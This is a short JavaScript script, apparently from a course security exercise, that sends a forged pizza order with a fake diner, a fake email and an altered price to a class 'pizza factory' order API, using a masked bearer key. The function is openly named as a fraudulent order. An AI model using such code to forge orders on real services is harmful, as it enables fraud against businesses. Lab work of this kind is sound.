const factoryUrl = 'https://pizza-factory.cs329.click/api/order';
const apiKey = '???????????????????????';
const requestBody = {
  diner: {
    id: 2,
    name: "Dr. Phil",
    email: "notarealuser@bacon.com"
  },
  order: {
    items: [
      {
        menuId: 2,
        description: "Pepperoni",
        price: 1234.56
      }
    ],
    storeId: "3",
    franchiseId: 1
  }
};
async function getFraudulentJWTPizza() {
  const response = await fetch(factoryUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', authorization: `Bearer ${apiKey}` },
    body: JSON.stringify(requestBody),
  });
  const j = await response.json();
  if (response.ok) {
    console.log('Order fulfilled successfully:', j);
  } else {
    console.error('Error making fake pizza.');
  }
}
getFraudulentJWTPizza();